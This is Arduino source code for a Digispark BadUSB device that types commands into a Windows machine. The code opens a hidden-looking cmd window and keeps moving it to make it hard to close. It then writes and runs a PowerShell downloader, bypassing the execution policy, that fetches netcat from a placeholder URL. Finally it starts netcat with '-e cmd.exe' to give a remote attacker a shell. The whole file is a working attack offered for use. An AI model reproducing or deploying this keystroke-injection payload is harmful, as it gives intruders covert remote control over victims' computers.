// Version 0.0.01

#include "DigiKeyboard.h"
/* Init function */
// Script created by valkyrix.github.io. 
// Updated by Tox1city



void setup()
{//Turn LED on while code is running, this means the device is safe to unplug as soon as the LED turns off
  pinMode(1, OUTPUT); //LED on Model A

  long randNumber;
  // Random function that seems to work 80% of the time all the time.. If you can fix this please contact me.
  uint16_t seed=0;
  uint8_t count=32;
  while (--count) {
    
    seed = (seed<<1) | (analogRead(A0)&1);
  }
  randomSeed(seed);
  
  randNumber = random(99999);
  
  DigiKeyboard.delay(500); //Wait 0.5 sec before turning into keyboard
  
  digitalWrite(1, HIGH); //Turn LED on when executing script
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1300); //Wait 1.3 sec before typing (the machine needs to initialize the keyboard)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //WIN + R
  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("cmd"); //Opens CMD
  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("color 01"); //Set the color of the window to make it hard to read, make %ra% a random number
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT); //Move the window to the left with WIN + ARROWLEFT to make it harder to exit the window
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("mkdir "); DigiKeyboard.print(randNumber); DigiKeyboard.print(" & cd "); DigiKeyboard.println(randNumber); //Make a random dir and open it
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("echo $clnt = new-object System.Net.WebClient;"); //The command print uses no enter on the end of the string, println does. This command is done in 4 stages to make it harder to click away the window, parses payload downloader in a Powershell script.
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(" $clnt.DownloadFile(\"http://yoururl.com/files/nc64.exe\""); //You can put your own verified nc64.exe link here
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(",\""); DigiKeyboard.print(randNumber); DigiKeyboard.print(".exe\") > "); DigiKeyboard.print(randNumber); DigiKeyboard.println(".ps1");
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("powershell -ExecutionPolicy ByPass -File "); DigiKeyboard.print(randNumber); DigiKeyboard.println(".ps1"); //Executes payload downloader in powershell
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("START /MIN "); DigiKeyboard.print(randNumber); DigiKeyboard.println(".exe IP PORT -e cmd.exe -d & exit"); //Starts netcat on the IP and port defined here
  digitalWrite(1, LOW); //Turn LED off
}

/* Unused endless loop */
void loop() {}
